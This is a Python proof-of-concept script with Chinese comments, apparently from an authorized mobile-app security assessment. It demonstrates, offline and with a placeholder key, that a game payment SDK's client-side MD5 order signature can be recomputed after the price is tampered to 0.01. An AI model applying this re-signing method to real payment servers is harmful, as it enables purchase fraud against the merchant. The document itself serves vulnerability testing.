#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-011 支付下单签名弱 —— 离线重签演示（partial PoC，纯离线）。

证据背景：
  - PaySignUtils 的 MD5 拼接签名思路（decompiled/jadx/sources/com/bianfeng/paylib/...，
    证据见 traffic-analysis/step4/vuln_analysis.json VULN-011）。
  - 价格等关键字段参与客户端侧 MD5 签名；若服务端不重新计价，低价重签可薅羊毛。

边界（重要）：
  - 服务端是否重新计价 blocked_on=no_authorization_online，本脚本不做任何发送。
  - 本 APK Manifest 未见 YMNSDK_WEBPAY_PRIVATE_KEY：私钥来自渠道包，需人工确认（TODO），
    此处一律使用占位私钥 <CHANNEL_PRIVATE_KEY> 字面量演示算法形态，而非真实重签。
"""
import argparse
import hashlib

PLACEHOLDER_KEY = "<CHANNEL_PRIVATE_KEY>"  # 占位私钥：真实值需渠道包确认（TODO）


def pay_sign(params: dict, private_key: str) -> str:
    """按 PaySignUtils 的 MD5 拼接思路：键按字典序 k=v 以 & 连接，末尾直接追加私钥。"""
    base = "&".join(f"{k}={params[k]}" for k in sorted(params))
    return hashlib.md5((base + private_key).encode("utf-8")).hexdigest()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="VULN-011 支付下单 MD5 重签离线演示（占位私钥，不联网）"
    )
    ap.add_argument("--price", required=True, help="原始价格，如 6.00")
    ap.add_argument("--product-id", required=True, help="商品 ID，如 com.xm.zjgamecenter.gold60000")
    ap.add_argument("--tampered-price", default="0.01", help="篡改后价格，默认 0.01")
    args = ap.parse_args()

    original = {"price": args.price, "productId": args.product_id}
    tampered = {"price": args.tampered_price, "productId": args.product_id}

    sign_orig = pay_sign(original, PLACEHOLDER_KEY)
    sign_tampered = pay_sign(tampered, PLACEHOLDER_KEY)

    print("[=] 占位私钥:", PLACEHOLDER_KEY, "（真实值需渠道包确认，本 APK Manifest 未见 YMNSDK_WEBPAY_PRIVATE_KEY）")
    print()
    print(f"[=] 原始下单参数  : {original}")
    print(f"    原始签名      : {sign_orig}")
    print()
    print(f"[=] 篡改下单参数  : {tampered}")
    print(f"    篡改后重签    : {sign_tampered}")
    print()
    print("[+] 结论演示：签名为客户端侧 MD5 拼接，拥有私钥即可对任意价格重签；")
    print("    若服务端不重新计价则成立——该点 blocked_on=no_authorization_online。")
    print("[!] 本脚本使用占位私钥且未联网，未向任何支付/游戏服务器发送数据。")
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
